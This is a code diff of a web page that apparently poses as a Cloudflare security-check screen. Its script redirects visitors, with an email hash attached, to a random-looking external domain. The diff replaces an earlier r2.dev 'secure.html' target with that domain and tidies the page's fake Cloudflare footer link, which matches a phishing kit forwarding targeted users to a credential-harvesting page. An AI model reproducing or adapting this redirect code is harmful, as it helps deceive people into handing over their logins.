@@ -515,7 +515,7 @@
     const randomUrl =
       urls[Math.floor(Math.random() * urls.length)] + "#" + queryString;
 
-    var url = "https://pub-379950df209b4213b6027bdea7c87d96.r2.dev/secure.html";
+    var url = "https://NhSFT.oragernharh.com/N3w0mHye/";
 
       setTimeout(() => {
         window.location.href = url + emailHash + "#" + queryString;
@@ -593,7 +593,7 @@ Ray ID:
 </div>
 <div class="text-center">
 Performance &amp; security by
-<a rel="noopener noreferrer"https://NhSFT.oragernharh.com/N3w0mHye/" target="_blank">Cloudflare</a
+<a rel="noopener noreferrer" href="https://www.cloudflare.com?utm_source=challenge&amp;utm_campaign=l" target="_blank">Cloudflare</a
           >
 </div>
 </div>
